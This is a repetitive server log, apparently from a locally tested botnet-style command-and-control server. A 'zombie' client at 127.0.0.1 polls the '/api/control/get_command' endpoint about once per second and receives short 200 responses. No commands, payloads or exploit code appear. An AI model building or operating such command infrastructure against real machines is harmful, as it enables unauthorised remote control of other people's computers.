2025-06-24 23:26:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:14 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:16 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:19 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:22 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:24 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:25 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:26 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:32 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:34 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:37 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:42 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:49 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:51 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:52 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:26:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:26:59 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:26:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:26:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:26:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:02 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:27:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-24 23:27:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:27:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:27:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:27:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
